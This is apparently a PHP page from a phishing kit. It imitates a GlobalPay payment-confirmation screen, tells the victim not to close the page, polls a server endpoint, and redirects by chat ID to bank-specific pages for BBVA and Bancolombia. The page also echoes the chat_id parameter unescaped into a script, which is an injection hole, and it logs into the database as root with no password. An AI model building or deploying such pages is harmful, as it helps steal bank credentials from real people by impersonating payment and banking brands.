<?php
// Iniciar la sesión
session_start();

// Conectar a la base de datos
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "status";

$conn = new mysqli($servername, $username, $password, $dbname);

// Verificar la conexión
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Obtener el ID del chat desde la URL
$chat_id = $_GET['chat_id'] ?? null;
$banco = $_GET['banco'] ?? null;

// Consultar el estado del pago en la base de datos
$sql = "SELECT status FROM pagos WHERE chat_id = ?";
$stmt = $conn->prepare($sql);
$stmt->bind_param("s", $chat_id);
$stmt->execute();
$result = $stmt->get_result();
$row = $result->fetch_assoc();

$status = $row['status'] ?? 'pending';

$stmt->close();
$conn->close();

// Verificar el estado del pago y redirigir si está completado
if ($status === 'completed') {
    // Redirigir a la página correspondiente según el banco
    switch ($banco) {
        case 'BANCO BBVA':
            header("Location: bbva.php");
            break;
        case 'BANCOLOMBIA':
            header("Location: bancolombia.php");
            break;
        // Añadir más casos según los bancos que necesites manejar
        default:
            header("Location: otro_banco.php");
            break;
    }
    exit();
}
?>

<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GlobalPay</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://pg-micros.globalpay.com.co/static/vtex/css/bootstrap.css" rel="stylesheet" type="text/css">
</head>
<body class="GlobalPay">

<article>
    <main>
        <div class="container container-loader">
            <div class="content shadow rounded">
                <div class="text-center">
                    <br><br>
                    <img src="img/200w2.webp" style="height: 80px;" class="brand-logo img-fluid" alt="auth_3ds_payment">
                </div>
                <div style="display: flex; align-items: center;justify-content: center;">
                    <h5 style="color: #3f28d8;">Confirmando pago...</h5>
                </div>
                <div style="display: flex; align-items: center;justify-content: center;">
                    <h5 style="color: #3f28d8;">No salga ni cierre esta página.</h5>
                </div>
            </div>
        </div>
    </main>
</article>

<script>
let isWaitingForResponse = false;

const fetchData = () => {
    const xhr = new XMLHttpRequest();

    xhr.onreadystatechange = function () {
        if (xhr.readyState === 4) {
            isWaitingForResponse = false; // Resetear la bandera cuando se reciba una respuesta (exitosa o no)
            if (xhr.status === 200) {
                try {
                    const response = xhr.responseText;
                   
                    window.location.href = response;
                    
                    } catch (e) {
                    console.error('Failed to parse JSON:', e);
                }
            } else {
                console.error('Network response was not ok:', xhr.statusText);
            }
        }
    };

    xhr.open("GET", "php/loading.php?chat_id=<?php echo $chat_id; ?>&banco=<?php echo urlencode($banco); ?>", true);
    xhr.send();
};

setInterval(() => {
    if (!isWaitingForResponse) {
        isWaitingForResponse = true;
        fetchData();
    }
}, 4000);
</script>

</body>
</html>
